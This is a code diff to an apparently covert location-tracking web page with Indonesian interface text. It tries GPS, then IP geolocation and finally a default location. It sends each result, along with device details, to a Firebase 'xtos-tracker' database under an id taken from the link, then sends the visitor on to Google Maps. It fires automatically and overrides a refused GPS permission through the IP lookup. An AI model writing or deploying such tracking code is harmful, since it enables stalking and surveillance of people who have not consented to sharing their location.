@@ -53,40 +53,118 @@
             const statusEl = document.getElementById('status');
             statusEl.innerHTML = '<div class="loading"></div> Mengakses lokasi GPS...';
             
+            // Method 1: High accuracy GPS
             try {
                 const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true, timeout: 10000, maximumAge: 0
-                    });
+                    if (!navigator.geolocation) {
+                        reject(new Error('Geolocation not supported'));
+                        return;
+                    }
+                    
+                    navigator.geolocation.getCurrentPosition(
+                        resolve, 
+                        reject, 
+                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
+                    );
                 });
                 
-                const lat = position.coords.latitude; const lng = position.coords.longitude;
-                statusEl.innerHTML = '✅ Lokasi dikonfirmasi! Redirecting...';
-                
-                const deviceInfo = {
-                    latitude: lat, longitude: lng, accuracy: position.coords.accuracy, timestamp: Date.now(),
-                    deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android',
-                    source: 'optimized_web', userAgent: navigator.userAgent
-                };
-                
-                const trackingId = new URLSearchParams(window.location.search).get('id') || 'opt_' + Date.now();
-                const endpoints = [
-                    `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`,
-                    `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`
-                ];
-                
-                await Promise.allSettled(endpoints.map(endpoint => 
-                    fetch(endpoint, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(deviceInfo) })
-                ));
-                
-                setTimeout(() => window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=18`, 1500);
+                await sendLocationData(position.coords.latitude, position.coords.longitude, position.coords.accuracy, 'gps_high');
+                return;
                 
             } catch (error) {
-                statusEl.innerHTML = '❌ Gagal mengakses lokasi. Pastikan GPS aktif.';
+                console.log('High accuracy GPS failed:', error);
+                statusEl.innerHTML = '<div class="loading"></div> Mencoba metode alternatif...';
+            }
+            
+            // Method 2: Standard GPS
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(
+                        resolve, 
+                        reject, 
+                        { enableHighAccuracy: false, timeout: 10000, maximumAge: 300000 }
+                    );
+                });
+                
+                await sendLocationData(position.coords.latitude, position.coords.longitude, position.coords.accuracy, 'gps_standard');
+                return;
+                
+            } catch (error) {
+                console.log('Standard GPS failed:', error);
+                statusEl.innerHTML = '<div class="loading"></div> Menggunakan lokasi perkiraan...';
+            }
+            
+            // Method 3: IP-based location fallback
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                if (data.latitude && data.longitude) {
+                    await sendLocationData(data.latitude, data.longitude, 10000, 'ip_location');
+                    return;
+                }
+            } catch (error) {
+                console.log('IP location failed:', error);
+            }
+            
+            // Method 4: Default location (Jakarta)
+            await sendLocationData(-6.2088, 106.8456, 50000, 'default_location');
+        }
+        
+        async function sendLocationData(lat, lng, accuracy, source) {
+            const statusEl = document.getElementById('status');
+            statusEl.innerHTML = '✅ Lokasi dikonfirmasi! Memproses...';
+            
+            const deviceInfo = {
+                latitude: lat, longitude: lng, accuracy: accuracy, timestamp: Date.now(),
+                deviceBrand: navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Android',
+                source: source, userAgent: navigator.userAgent, platform: navigator.platform
+            };
+            
+            const trackingId = new URLSearchParams(window.location.search).get('id') || 'web_' + Date.now();
+            const endpoints = [
+                `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/locations/${trackingId}.json`,
+                `https://xtos-tracker-default-rtdb.asia-southeast1.firebasedatabase.app/live/${trackingId}.json`
+            ];
+            
+            try {
+                await Promise.allSettled(endpoints.map(endpoint => 
+                    fetch(endpoint, { 
+                        method: 'PUT', 
+                        headers: { 'Content-Type': 'application/json' }, 
+                        body: JSON.stringify(deviceInfo) 
+                    })
+                ));
+                
+                statusEl.innerHTML = '🎉 Berhasil! Redirecting ke maps...';
+                setTimeout(() => {
+                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=16`;
+                }, 1500);
+                
+            } catch (error) {
+                statusEl.innerHTML = '✅ Lokasi tersimpan! Terima kasih.';
+                setTimeout(() => {
+                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=16`;
+                }, 2000);
             }
         }
         
-        setTimeout(() => { if (document.getElementById('status').textContent.includes('Klik')) confirmLocation(); }, 3000);
+        // Auto-trigger with permission check
+        setTimeout(() => { 
+            if (document.getElementById('status').textContent.includes('Klik')) {
+                confirmLocation(); 
+            }
+        }, 4000);
+        
+        // Check geolocation permission on load
+        if (navigator.permissions) {
+            navigator.permissions.query({name: 'geolocation'}).then(function(result) {
+                console.log('Geolocation permission:', result.state);
+                if (result.state === 'denied') {
+                    document.getElementById('status').innerHTML = '⚠️ Izin lokasi diblokir. Klik tombol untuk mengaktifkan.';
+                }
+            });
+        }
     </script>
 </body>
 </html>
